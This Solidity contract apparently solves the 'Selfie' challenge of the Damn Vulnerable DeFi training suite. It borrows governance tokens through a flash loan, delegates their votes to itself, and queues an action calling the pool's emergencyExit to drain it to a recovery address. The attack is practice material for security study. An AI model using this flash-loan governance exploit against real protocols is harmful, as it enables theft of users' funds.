// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {
    IERC3156FlashBorrower
} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {
    IERC3156FlashLender
} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import {DamnValuableVotes} from "../DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";

contract MaliciousBorrower is IERC3156FlashBorrower {
    SimpleGovernance governance;
    IERC3156FlashLender public immutable lender;
    DamnValuableVotes public immutable token;

    address public recovery;
    uint256 public actionId;

    constructor(address _lender, DamnValuableVotes _token) {
        lender = IERC3156FlashLender(_lender);
        token = _token;
    }

    function executeFlashLoan(
        uint256 amount,
        SimpleGovernance _governance,
        address _recovery
    ) external {
        governance = _governance;
        recovery = _recovery;
        lender.flashLoan(this, address(token), amount, "");
    }

    function onFlashLoan(
        address initiator,
        address tokenAddress,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        //delegate voting power
        token.delegate(address(this));
        bytes memory data2 = abi.encodeCall(
            SelfiePool.emergencyExit,
            (recovery)
        );
        actionId = governance.queueAction(address(lender), 0, data2);

        // Must approve the lender to take the loan back.
        DamnValuableVotes(tokenAddress).approve(msg.sender, amount + fee);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
